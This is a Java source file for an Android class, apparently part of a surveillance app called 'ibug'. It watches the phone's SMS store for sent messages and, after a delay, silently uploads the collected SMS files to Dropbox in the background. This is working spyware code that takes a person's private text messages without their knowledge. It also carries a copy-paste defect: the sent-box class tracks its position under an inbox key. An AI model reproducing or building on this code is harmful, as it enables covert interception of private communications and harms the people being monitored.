package com.ibug.sms;

import android.content.ContentResolver;
import android.database.ContentObserver;
import androidx.annotation.Nullable;
import com.ibug.IAnnotations.*;
import com.ibug.misc.Dropbox;
import com.ibug.misc.SharedPreference;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;

import java.io.File;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import static com.ibug.misc.Dropbox.isUploading;
import static com.ibug.misc.Utils.smsLocation;
import static com.ibug.misc.Utils.makeLocalSmsFile;


public class Sentbox extends SmsTask {

    @Override
    public int getType() {
        return MESSAGE_TYPE_SENT;
    }

    @Override
    public String writeToLocation() {
        Date date = new Date();
        return makeLocalSmsFile(context, "sentbox", date.getTime());
    }

    @Override
    public String lastProcessedMessage(Context context) {
        return preference.get("LastInboxSms");
    }

    @Override
    public void lastMessageKey(String value) {
        preference.add("LastInboxSms", value);
    }

    @Constructor
    public Sentbox(Context _context) {
        super(_context);
        context = _context;
        preference = new SharedPreference(context);
    }

    @StartMethod
    public void executeTask() {
        Executors.newSingleThreadExecutor().execute( ()-> {
            runOnBackground();
            new Handler( Looper.getMainLooper() ).post( ()->{
                // runOnUIThread();
            });
        });
    }

    @StartMethod
    public ContentObserver registerContentObserver(Context context) {
        ContentObserver contentObserver = new ContentObserver(null) {
            @Override
            public void onChange(boolean selfChange, @Nullable Uri uri) {
                super.onChange(selfChange, uri);
                if(delay++ == 0) {
                    if(!processing) // avoid multiple background process
                    Executors.newSingleThreadScheduledExecutor().schedule( ()-> {
                        runOnBackground();
                        processing = false;
                        delay = 0;
                    }, 60, TimeUnit.SECONDS);
                }
            }
        };

        ContentResolver contentResolver = context.getContentResolver();
        contentResolver.registerContentObserver(smsURI,true, contentObserver);

        return contentObserver;
    }

    @BackgroundTask
    private void runOnBackground() {
        processing = true;
        super.execute(()->{
            if (isUploading) return;
            String smsDir = smsLocation(context);
            Dropbox dropbox = new Dropbox(context);
            dropbox.upload(new File(smsDir));
        });
    }

    public void unregisterContentObserver(Context context, ContentObserver contentObserver) {
        if(contentObserver == null) return;
        ContentResolver contentResolver = context.getContentResolver();
        contentResolver.unregisterContentObserver(contentObserver);
    }

    private static int delay = 0;
    private final Context context;
    private final int MESSAGE_TYPE_SENT = 2;
    private final SharedPreference preference;
    private Boolean processing = new Boolean(false);
    private final Uri smsURI = Uri.parse("content://sms");

}
